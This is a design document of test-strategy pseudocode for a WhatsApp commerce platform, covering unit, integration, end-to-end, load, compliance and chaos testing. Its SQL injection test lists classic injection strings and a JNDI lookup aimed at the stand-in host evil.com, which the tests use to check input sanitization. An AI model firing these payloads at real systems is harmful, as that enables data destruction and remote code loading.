# Test Strategy Pseudocode

## 1. Unit Testing Strategy (TDD London School)

```pseudocode
STRATEGY UnitTestingTDD {
    PRINCIPLES: [
        "Test behavior, not implementation",
        "Mock all dependencies",
        "One assertion per test",
        "Fast execution (<1ms per test)",
        "Isolated from external systems"
    ]
    
    PATTERN TestStructure {
        // Arrange-Act-Assert pattern
        FUNCTION testPattern(testName, testFunction) {
            DESCRIBE testName {
                // Arrange
                mocks = setupMocks()
                sut = createSystemUnderTest(mocks)
                
                // Act
                result = sut.executeMethod()
                
                // Assert
                EXPECT(result).toBe(expectedValue)
                VERIFY(mocks).wereCalledCorrectly()
            }
        }
    }
    
    EXAMPLE WhatsAppServiceTests {
        DESCRIBE "WhatsAppService.handleWebhook" {
            beforeEach() {
                mockMessageQueue = createMock(MessageQueue)
                mockRedisCache = createMock(RedisCache)
                mockTenantService = createMock(TenantService)
                
                service = new WhatsAppService(
                    mockMessageQueue,
                    mockRedisCache,
                    mockTenantService
                )
            }
            
            TEST "should acknowledge webhook immediately" {
                // Arrange
                request = {
                    headers: {'x-hub-signature-256': validSignature},
                    body: validWebhookPayload
                }
                
                // Act
                response = service.handleWebhook(request)
                
                // Assert
                EXPECT(response.status).toBe(200)
                EXPECT(response.body).toBe("OK")
            }
            
            TEST "should publish message to queue asynchronously" {
                // Arrange
                request = createValidWebhookRequest()
                
                // Act
                service.handleWebhook(request)
                
                // Assert
                VERIFY(mockMessageQueue.publishToQueue)
                    .wasCalledWith(request.body)
                    .asynchronously()
            }
            
            TEST "should reject invalid signature" {
                // Arrange
                request = {
                    headers: {'x-hub-signature-256': 'invalid'},
                    body: webhookPayload
                }
                
                // Act
                response = service.handleWebhook(request)
                
                // Assert
                EXPECT(response.status).toBe(401)
                VERIFY(mockMessageQueue.publishToQueue).wasNotCalled()
            }
        }
    }
    
    EXAMPLE PaymentServiceTests {
        DESCRIBE "PaymentService.processPayment" {
            beforeEach() {
                mockPaystack = createMock(PaystackGateway)
                mockOzow = createMock(OzowGateway)
                mockRedis = createMock(RedisCache)
                mockEventBus = createMock(EventBus)
                
                service = new PaymentService({
                    gateways: {paystack: mockPaystack, ozow: mockOzow},
                    cache: mockRedis,
                    eventBus: mockEventBus
                })
            }
            
            TEST "should use idempotency key to prevent duplicate charges" {
                // Arrange
                order = createTestOrder()
                existingPayment = {id: "pay_123", status: "success"}
                
                WHEN(mockRedis.get("payment:order_123:card"))
                    .thenReturn(existingPayment)
                
                // Act
                result = service.processPayment(order, "card")
                
                // Assert
                EXPECT(result).toBe(existingPayment)
                VERIFY(mockPaystack.charge).wasNotCalled()
            }
            
            TEST "should fallback to secondary gateway on failure" {
                // Arrange
                order = createTestOrder()
                
                WHEN(mockPaystack.charge(ANY))
                    .thenThrow(new GatewayException("Network error"))
                
                WHEN(mockOzow.charge(ANY))
                    .thenReturn({status: "success", id: "pay_456"})
                
                // Act
                result = service.processPayment(order, "eft")
                
                // Assert
                EXPECT(result.gateway).toBe("ozow")
                VERIFY(mockPaystack.charge).wasCalledOnce()
                VERIFY(mockOzow.charge).wasCalledOnce()
            }
        }
    }
}
```

## 2. Integration Testing Strategy

```pseudocode
STRATEGY IntegrationTesting {
    TOOLS: ["TestContainers", "Docker Compose", "Fixture Data"]
    
    SETUP TestEnvironment {
        containers = {
            postgres: TestContainers.PostgreSQL("15-alpine"),
            redis: TestContainers.Redis("7-alpine"),
            rabbitmq: TestContainers.RabbitMQ("3.12-alpine"),
            elasticsearch: TestContainers.Elasticsearch("8.11")
        }
        
        FUNCTION setupTestEnvironment() {
            // Start all containers
            FOR container IN containers {
                container.start()
                container.waitForHealthy()
            }
            
            // Run migrations
            postgres.runMigrations("./migrations")
            
            // Create test schemas
            FOR tenant IN ["test_tenant_1", "test_tenant_2"] {
                postgres.createSchema(tenant)
            }
            
            // Load fixture data
            loadFixtures({
                tenants: "./fixtures/tenants.json",
                products: "./fixtures/products.json",
                users: "./fixtures/users.json"
            })
        }
        
        FUNCTION teardownTestEnvironment() {
            FOR container IN containers {
                container.stop()
                container.remove()
            }
        }
    }
    
    EXAMPLE DatabaseIntegrationTests {
        DESCRIBE "TenantService Integration" {
            beforeAll() {
                setupTestEnvironment()
                tenantService = new TenantService(postgres.getConnection())
            }
            
            afterAll() {
                teardownTestEnvironment()
            }
            
            TEST "should provision tenant with proper isolation" {
                // Arrange
                tenantData = {
                    id: "tenant_123",
                    name: "Test Store",
                    phone: "+27821234567"
                }
                
                // Act
                result = tenantService.provisionTenant(tenantData)
                
                // Assert
                EXPECT(result.success).toBe(true)
                
                // Verify schema created
                schemas = postgres.query("SELECT schema_name FROM information_schema.schemata")
                EXPECT(schemas).toContain("tenant_tenant_123")
                
                // Verify RLS policies
                policies = postgres.query(`
                    SELECT polname FROM pg_policies 
                    WHERE schemaname = 'tenant_tenant_123'
                `)
                EXPECT(policies.length).toBeGreaterThan(0)
            }
            
            TEST "should handle concurrent tenant operations" {
                // Arrange
                tenants = generateTestTenants(10)
                promises = []
                
                // Act - Provision tenants concurrently
                FOR tenant IN tenants {
                    promise = ASYNC tenantService.provisionTenant(tenant)
                    promises.append(promise)
                }
                
                results = AWAIT Promise.all(promises)
                
                // Assert
                FOR result IN results {
                    EXPECT(result.success).toBe(true)
                }
                
                // Verify no conflicts
                schemaCount = postgres.query("SELECT COUNT(*) FROM information_schema.schemata WHERE schema_name LIKE 'tenant_%'")
                EXPECT(schemaCount).toBe(10)
            }
        }
    }
    
    EXAMPLE MessageQueueIntegrationTests {
        DESCRIBE "Order Processing Pipeline" {
            beforeAll() {
                setupTestEnvironment()
                
                // Setup services
                orderService = new OrderService(postgres, rabbitmq)
                paymentService = new PaymentService(postgres, rabbitmq)
                notificationService = new NotificationService(rabbitmq)
                
                // Start consumers
                orderService.startConsumer()
                paymentService.startConsumer()
                notificationService.startConsumer()
            }
            
            TEST "should process order through entire pipeline" {
                // Arrange
                order = createTestOrder()
                messageReceived = false
                
                notificationService.on("order.completed", () => {
                    messageReceived = true
                })
                
                // Act
                orderService.createOrder(order)
                
                // Wait for pipeline completion
                WAIT_FOR(() => messageReceived, timeout: 5000)
                
                // Assert
                savedOrder = postgres.query("SELECT * FROM orders WHERE id = $1", order.id)
                EXPECT(savedOrder.status).toBe("completed")
                
                payment = postgres.query("SELECT * FROM payments WHERE order_id = $1", order.id)
                EXPECT(payment).toBeDefined()
                
                EXPECT(messageReceived).toBe(true)
            }
        }
    }
}
```

## 3. End-to-End Testing Strategy

```pseudocode
STRATEGY EndToEndTesting {
    FRAMEWORK: "Playwright + WhatsApp Test Client"
    
    SETUP E2EEnvironment {
        FUNCTION setupE2EEnvironment() {
            // Start full application stack
            docker.compose.up("docker-compose.test.yml")
            
            // Initialize WhatsApp test client
            whatsappClient = new WhatsAppTestClient({
                apiUrl: process.env.WHATSAPP_TEST_API,
                testPhoneNumbers: ["+27820000001", "+27820000002", "+27820000003"]
            })
            
            // Seed test data
            seedTestData({
                vendors: 5,
                products: 50,
                customers: 10,
                drivers: 3
            })
        }
    }
    
    EXAMPLE VendorOnboardingE2E {
        DESCRIBE "Vendor Onboarding Journey" {
            TEST "Uncle Charles can list a product via WhatsApp" {
                // Arrange
                uncleCharles = whatsappClient.createUser("+27820000001", "Uncle Charles")
                
                // Act & Assert - Follow conversation flow
                
                // 1. Initial contact
                uncleCharles.sendMessage("Hi, I want to sell something")
                response = uncleCharles.waitForResponse()
                EXPECT(response.text).toContain("I can help with that")
                EXPECT(response.text).toContain("send me a clear photo")
                
                // 2. Send product image
                uncleCharles.sendImage("./test-assets/potatoes.jpg")
                response = uncleCharles.waitForResponse()
                EXPECT(response.text).toContain("looks like a great product")
                EXPECT(response.text).toContain("what is the name")
                
                // 3. Provide product name
                uncleCharles.sendMessage("Uncle Charles's Fresh Potatoes")
                response = uncleCharles.waitForResponse()
                EXPECT(response.text).toContain("what price")
                
                // 4. Set price
                uncleCharles.sendMessage("50")
                response = uncleCharles.waitForResponse()
                EXPECT(response.text).toContain("tell me a little bit about it")
                
                // 5. Add description
                uncleCharles.sendMessage("Fresh from my garden in Westridge. Very tasty.")
                response = uncleCharles.waitForResponse()
                EXPECT(response.text).toContain("DRAFT")
                EXPECT(response.buttons).toContain("Yes, List It!")
                
                // 6. Confirm listing
                uncleCharles.clickButton("Yes, List It!")
                response = uncleCharles.waitForResponse()
                EXPECT(response.text).toContain("Your product")
                EXPECT(response.text).toContain("is now live")
                
                // Verify in database
                product = database.query(`
                    SELECT * FROM products 
                    WHERE name = 'Uncle Charles''s Fresh Potatoes'
                `)
                EXPECT(product).toBeDefined()
                EXPECT(product.price).toBe(5000) // Cents
                EXPECT(product.status).toBe("active")
            }
        }
    }
    
    EXAMPLE CustomerPurchaseE2E {
        DESCRIBE "Customer Purchase Journey" {
            TEST "Brenda can search and buy products" {
                // Arrange
                brenda = whatsappClient.createUser("+27820000002", "Brenda")
                
                // Act - Search for products
                brenda.sendMessage("Hi Wakala, I'm looking for a hoodie in Mitchells Plain")
                searchResults = brenda.waitForResponse()
                
                // Assert search results
                EXPECT(searchResults.type).toBe("interactive")
                EXPECT(searchResults.products.length).toBeGreaterThan(0)
                
                // Select product
                brenda.clickButton("Add to Cart", productId: searchResults.products[0].id)
                cartResponse = brenda.waitForResponse()
                EXPECT(cartResponse.text).toContain("added to your cart")
                
                // Checkout
                brenda.clickButton("Checkout")
                addressConfirm = brenda.waitForResponse()
                EXPECT(addressConfirm.text).toContain("confirm your delivery address")
                
                brenda.clickButton("Yes, Confirm Address")
                paymentPrompt = brenda.waitForResponse()
                EXPECT(paymentPrompt.text).toContain("choose your payment method")
                
                // Simulate payment
                paymentLink = extractPaymentLink(paymentPrompt)
                paymentResult = simulatePaystackPayment(paymentLink, {
                    card: "4084084084084081",
                    cvv: "123",
                    expiry: "12/25"
                })
                
                // Verify order confirmation
                orderConfirmation = brenda.waitForResponse()
                EXPECT(orderConfirmation.text).toContain("Payment successful")
                EXPECT(orderConfirmation.text).toMatch(/order #\d+/)
                
                // Extract order number
                orderNumber = extractOrderNumber(orderConfirmation.text)
                
                // Verify order in database
                order = database.query("SELECT * FROM orders WHERE id = $1", orderNumber)
                EXPECT(order.status).toBe("paid")
                EXPECT(order.customer_phone).toBe("+27820000002")
            }
        }
    }
    
    EXAMPLE DriverDeliveryE2E {
        DESCRIBE "Driver Delivery Journey" {
            TEST "David receives and completes delivery" {
                // Setup - Create an order ready for delivery
                orderId = createPaidOrder()
                markOrderReadyForPickup(orderId)
                
                david = whatsappClient.createUser("+27820000003", "David")
                david.setDriverStatus("available")
                david.setLocation(-33.9249, 18.4241) // Cape Town
                
                // Wait for job notification
                jobOffer = david.waitForResponse(timeout: 10000)
                EXPECT(jobOffer.text).toContain("New Delivery Job Available")
                EXPECT(jobOffer.text).toContain("R40.00")
                
                // Accept job
                david.clickButton("Accept Job")
                acceptance = david.waitForResponse()
                EXPECT(acceptance.text).toContain("Order #" + orderId + " is yours")
                
                // Simulate pickup
                david.setLocation(pickupLocation)
                david.sendMessage("Picked up order")
                
                // Simulate delivery
                david.setLocation(dropoffLocation)
                david.sendMessage("Delivered to customer")
                
                // Verify completion
                completion = david.waitForResponse()
                EXPECT(completion.text).toContain("Delivery completed")
                EXPECT(completion.text).toContain("earned R40.00")
                
                // Verify in database
                delivery = database.query("SELECT * FROM deliveries WHERE order_id = $1", orderId)
                EXPECT(delivery.status).toBe("completed")
                EXPECT(delivery.driver_id).toBe(david.id)
            }
        }
    }
}
```

## 4. Performance Testing Strategy

```pseudocode
STRATEGY PerformanceTesting {
    TOOLS: ["k6", "Grafana", "InfluxDB"]
    
    SCENARIOS LoadTestScenarios {
        SCENARIO "WhatsApp Webhook Performance" {
            CONFIG: {
                vus: 1000, // Virtual users
                duration: "5m",
                thresholds: {
                    http_req_duration: ["p(95)<250"], // 95% under 250ms
                    http_req_failed: ["rate<0.01"], // Error rate < 1%
                    http_reqs: ["rate>1000"] // 1000+ RPS
                }
            }
            
            SCRIPT: {
                import http from 'k6/http'
                import { check } from 'k6'
                
                export default function() {
                    let payload = generateWebhookPayload()
                    let signature = generateHMACSignature(payload)
                    
                    let response = http.post(
                        'https://api.wakala.test/webhooks/whatsapp',
                        payload,
                        {
                            headers: {
                                'x-hub-signature-256': signature,
                                'Content-Type': 'application/json'
                            }
                        }
                    )
                    
                    check(response, {
                        'status is 200': (r) => r.status === 200,
                        'response time < 250ms': (r) => r.timings.duration < 250
                    })
                }
            }
        }
        
        SCENARIO "Concurrent Message Processing" {
            CONFIG: {
                stages: [
                    { duration: '2m', target: 100 },  // Ramp up
                    { duration: '5m', target: 1000 }, // Stay at 1000
                    { duration: '2m', target: 0 }     // Ramp down
                ],
                thresholds: {
                    message_processing_time: ["p(99)<5000"], // 99% under 5s
                    message_throughput: ["rate>1000000"] // 1M+ messages/day
                }
            }
            
            SCRIPT: {
                export default function() {
                    // Simulate different message types
                    let messageTypes = ['text', 'image', 'interactive']
                    let messageType = messageTypes[Math.floor(Math.random() * 3)]
                    
                    let message = generateMessage(messageType)
                    publishToQueue('whatsapp.inbound', message)
                    
                    // Track custom metrics
                    trend('message_processing_time', processingTime)
                    counter('message_throughput', 1)
                }
            }
        }
        
        SCENARIO "Database Sharding Performance" {
            CONFIG: {
                vus: 500,
                duration: "10m",
                thresholds: {
                    db_query_duration: ["p(95)<100"], // 95% under 100ms
                    cross_shard_query_duration: ["p(95)<500"] // 95% under 500ms
                }
            }
            
            SCRIPT: {
                export default function() {
                    let tenantId = selectRandomTenant()
                    
                    // Single shard query
                    let start = Date.now()
                    let products = queryProducts(tenantId)
                    trend('db_query_duration', Date.now() - start)
                    
                    // Cross shard query
                    start = Date.now()
                    let analytics = queryCrossShardAnalytics()
                    trend('cross_shard_query_duration', Date.now() - start)
                }
            }
        }
    }
    
    MONITORING PerformanceMetrics {
        METRICS: [
            {
                name: "webhook_latency",
                query: "histogram_quantile(0.95, http_request_duration_seconds)",
                alert: "> 0.25"
            },
            {
                name: "message_throughput",
                query: "rate(messages_processed_total[5m])",
                alert: "< 11.57" // 1M/day = ~11.57/second
            },
            {
                name: "payment_success_rate",
                query: "rate(payments_successful[5m]) / rate(payments_total[5m])",
                alert: "< 0.95"
            },
            {
                name: "database_connections",
                query: "pg_stat_database_numbackends",
                alert: "> 80% of max_connections"
            }
        ]
    }
}
```

## 5. Security Testing Strategy

```pseudocode
STRATEGY SecurityTesting {
    TOOLS: ["OWASP ZAP", "SQLMap", "Burp Suite"]
    
    TESTS POPIAComplianceTests {
        TEST "Data Encryption at Rest" {
            // Verify database encryption
            tables = database.query(`
                SELECT tablename FROM pg_tables 
                WHERE schemaname LIKE 'tenant_%'
            `)
            
            FOR table IN tables {
                encryption = checkTableEncryption(table)
                EXPECT(encryption.algorithm).toBe("AES-256")
                EXPECT(encryption.enabled).toBe(true)
            }
            
            // Verify file storage encryption
            files = storage.listFiles("/uploads")
            FOR file IN files {
                EXPECT(file.isEncrypted()).toBe(true)
            }
        }
        
        TEST "Right to Erasure Implementation" {
            // Create test user data
            userId = createTestUser()
            orderId = createTestOrder(userId)
            
            // Request data deletion
            response = api.delete("/users/${userId}/data")
            EXPECT(response.status).toBe(200)
            
            // Verify deletion
            userData = database.query("SELECT * FROM users WHERE id = $1", userId)
            EXPECT(userData).toBeNull()
            
            // Verify cascading deletion
            orderData = database.query("SELECT * FROM orders WHERE user_id = $1", userId)
            EXPECT(orderData).toBeNull()
            
            // Verify audit log
            auditLog = database.query("SELECT * FROM audit_logs WHERE action = 'user_data_deleted'")
            EXPECT(auditLog.user_id).toBe(userId)
        }
        
        TEST "Data Retention Policies" {
            // Create old data
            oldOrder = createTestOrder(timestamp: Date.now() - 366 * 24 * 60 * 60 * 1000)
            
            // Run retention job
            runDataRetentionJob()
            
            // Verify old data removed
            order = database.query("SELECT * FROM orders WHERE id = $1", oldOrder.id)
            EXPECT(order).toBeNull()
            
            // Verify anonymized analytics retained
            analytics = database.query("SELECT * FROM order_analytics WHERE order_id = $1", oldOrder.id)
            EXPECT(analytics).toBeDefined()
            EXPECT(analytics.customer_id).toBeNull()
        }
    }
    
    TESTS SQLInjectionTests {
        TEST "WhatsApp Message Input Sanitization" {
            injectionPayloads = [
                "'; DROP TABLE users; --",
                "1' OR '1'='1",
                "1'; UPDATE products SET price=0; --",
                "${jndi:ldap://evil.com/a}"
            ]
            
            FOR payload IN injectionPayloads {
                response = sendWhatsAppMessage(payload)
                
                // Verify no SQL execution
                EXPECT(response.status).toBe(200)
                
                // Verify tables still exist
                tables = database.query("SELECT COUNT(*) FROM pg_tables")
                EXPECT(tables.count).toBeGreaterThan(0)
                
                // Verify data integrity
                products = database.query("SELECT * FROM products WHERE price = 0")
                EXPECT(products.length).toBe(0)
            }
        }
    }
    
    TESTS AuthenticationTests {
        TEST "JWT Token Security" {
            // Test token expiry
            token = generateJWT({tenant_id: "test", exp: Date.now() - 1000})
            response = api.get("/protected", {headers: {Authorization: `Bearer ${token}`}})
            EXPECT(response.status).toBe(401)
            
            // Test tenant isolation
            tokenTenant1 = generateValidJWT({tenant_id: "tenant_1"})
            response = api.get("/tenants/tenant_2/data", {
                headers: {Authorization: `Bearer ${tokenTenant1}`}
            })
            EXPECT(response.status).toBe(403)
            
            // Test token rotation
            refreshToken = login("user@test.com", "password")
            newTokens = api.post("/auth/refresh", {refresh_token: refreshToken})
            EXPECT(newTokens.access_token).not.toBe(refreshToken)
            
            // Verify old refresh token invalidated
            response = api.post("/auth/refresh", {refresh_token: refreshToken})
            EXPECT(response.status).toBe(401)
        }
    }
}
```

## 6. Chaos Engineering Strategy

```pseudocode
STRATEGY ChaosEngineering {
    FRAMEWORK: "Chaos Monkey + Custom Scenarios"
    
    EXPERIMENTS ChaosExperiments {
        EXPERIMENT "Database Failover" {
            SETUP: {
                duration: "30m",
                blast_radius: "50%", // Affect 50% of database nodes
                steady_state: {
                    order_success_rate: "> 99%",
                    payment_processing: "< 5s",
                    message_delivery: "< 10s"
                }
            }
            
            SCENARIO: {
                // Kill primary database
                chaos.killProcess("postgresql-primary")
                
                // Monitor failover
                WAIT_FOR(isDatabaseHealthy, timeout: 30000)
                
                // Verify steady state maintained
                metrics = collectMetrics(duration: 300000) // 5 minutes
                
                EXPECT(metrics.order_success_rate).toBeGreaterThan(0.99)
                EXPECT(metrics.payment_processing_p95).toBeLessThan(5000)
                EXPECT(metrics.message_delivery_p95).toBeLessThan(10000)
                
                // Verify data consistency
                checkDataConsistency()
            }
        }
        
        EXPERIMENT "Message Queue Failure" {
            SETUP: {
                duration: "15m",
                target: "rabbitmq",
                steady_state: {
                    message_loss: "0%",
                    processing_delay: "< 30s"
                }
            }
            
            SCENARIO: {
                // Simulate network partition
                chaos.networkPartition("rabbitmq-cluster", duration: 60000)
                
                // Send test messages during partition
                messageIds = []
                FOR i IN [1..100] {
                    messageId = sendTestMessage()
                    messageIds.append(messageId)
                }
                
                // Wait for partition to heal
                WAIT 70000
                
                // Verify all messages processed
                FOR messageId IN messageIds {
                    status = checkMessageStatus(messageId)
                    EXPECT(status).toBe("processed")
                }
                
                // Check for duplicates
                duplicates = database.query(`
                    SELECT message_id, COUNT(*) 
                    FROM processed_messages 
                    GROUP BY message_id 
                    HAVING COUNT(*) > 1
                `)
                EXPECT(duplicates.length).toBe(0)
            }
        }
        
        EXPERIMENT "Cascading Service Failure" {
            SCENARIO: {
                // Fail payment service
                chaos.injectLatency("payment-service", latency: 10000)
                
                // Monitor circuit breakers
                WAIT 30000
                circuitStatus = getCircuitBreakerStatus("payment-service")
                EXPECT(circuitStatus).toBe("open")
                
                // Verify graceful degradation
                order = createTestOrder()
                response = processOrder(order)
                EXPECT(response.status).toBe("pending_payment")
                EXPECT(response.message).toContain("payment processing delayed")
                
                // Remove latency
                chaos.removeLatency("payment-service")
                
                // Verify recovery
                WAIT_FOR(() => {
                    status = getCircuitBreakerStatus("payment-service")
                    return status == "closed"
                }, timeout: 60000)
                
                // Process pending orders
                processPendingPayments()
                
                // Verify order completed
                orderStatus = getOrderStatus(order.id)
                EXPECT(orderStatus).toBe("completed")
            }
        }
        
        EXPERIMENT "High Load with Failures" {
            SCENARIO: {
                // Generate high load
                loadGenerator.start({
                    rps: 5000,
                    duration: "10m"
                })
                
                // Inject random failures
                chaos.randomPodKill({
                    namespace: "wakala-prod",
                    interval: 60000, // Every minute
                    probability: 0.1 // 10% chance
                })
                
                // Monitor SLOs
                sloMonitor = startSLOMonitoring({
                    availability: 0.999,
                    latency_p99: 1000,
                    error_rate: 0.01
                })
                
                // Wait for experiment completion
                WAIT 600000 // 10 minutes
                
                // Verify SLOs maintained
                results = sloMonitor.getResults()
                EXPECT(results.availability).toBeGreaterThan(0.999)
                EXPECT(results.latency_p99).toBeLessThan(1000)
                EXPECT(results.error_rate).toBeLessThan(0.01)
            }
        }
    }
    
    RECOVERY RecoveryValidation {
        FUNCTION validateRecovery(experiment) {
            // Check system health
            health = getSystemHealth()
            EXPECT(health.status).toBe("healthy")
            
            // Verify no data loss
            dataIntegrity = checkDataIntegrity()
            EXPECT(dataIntegrity.corrupted_records).toBe(0)
            EXPECT(dataIntegrity.missing_records).toBe(0)
            
            // Verify no zombie processes
            zombies = findZombieProcesses()
            EXPECT(zombies.length).toBe(0)
            
            // Verify resource cleanup
            resources = checkResourceLeaks()
            EXPECT(resources.leaked_connections).toBe(0)
            EXPECT(resources.leaked_memory).toBe(0)
        }
    }
}
```